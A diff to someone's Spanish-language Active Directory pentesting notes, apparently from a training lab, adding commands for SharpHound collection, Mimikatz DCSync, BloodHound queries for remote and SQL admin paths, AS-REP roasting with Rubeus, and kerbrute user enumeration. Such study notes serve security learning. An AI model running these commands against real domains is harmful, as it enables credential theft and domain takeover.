@@ -97,7 +97,8 @@ Test-AdminAccess -ComputerName <nombre de maquina>
 ----------
 ##SharpHound
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
-#Permite sacar la data y usarla en BloodHound GUI tool
+#Permite sacar la data y usarla en BloodHound GUI tool.
+#El output no es exacto el nombre que le ponemos sno una serie de numeros_nombre
 
 
 ----------  ----------  ----------  ----------
@@ -300,4 +301,31 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 ##DCSync: Mimikatz
 .\mimikatz.exe
 lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+----------  ----------  ----------  ----------
+	### Privileged access
+
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+#Enumerar que grupo de usuarios (member name) tiene acceso a escritorio remoto
+
+##Bloodhound
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+#Muestra usuarios tienen acceso PSremote 
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+#Permite conocer usuarios con privilegios de admin en SQL
+
+----------  ----------  ----------  ----------
+	### ASEProasting
+Cuando un usuario tiene Do not require Kerberos pre-authentication, se puede realizar una solicitud del ticket TGT
+
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+#Ver usuarios que no necesitan pre auth
+.\Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
+#Devuelve hash para cracker
+
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+#ASREP con kerbrute
+
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+#Buscando usuarios con no preauth activado
 
